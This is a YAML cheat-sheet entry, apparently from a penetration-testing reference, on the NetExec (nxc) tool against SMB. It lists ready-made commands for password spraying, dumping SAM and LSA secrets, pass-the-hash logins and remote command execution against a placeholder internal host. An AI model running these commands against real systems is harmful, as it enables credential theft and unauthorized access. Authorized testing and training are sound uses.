---
description: |
  NetExec (nxc) — the successor to CrackMapExec. Enumerate SMB,
  check creds, spray passwords, dump hashes, and execute commands.

  Reference values:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Check credentials
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123'

  # Enumerate shares
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --shares

  # Password spraying
  nxc smb 10.10.10.1 -u users.txt -p 'P@ssw0rd123' --continue-on-success

  # Dump SAM
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --sam

  # Dump LSA secrets
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --lsa

  # Pass-the-Hash
  nxc smb 10.10.10.1 -u pentuser -H aad3b435b51404eeaad3b435b51404ee

  # Execute command
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -x "whoami"

  # Spider shares for files
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -M spider_plus
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - SMB
items:
  - Username
  - Password
  - Hash
techniques:
  - Password_Spraying
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/Pennyw0rth/NetExec
---
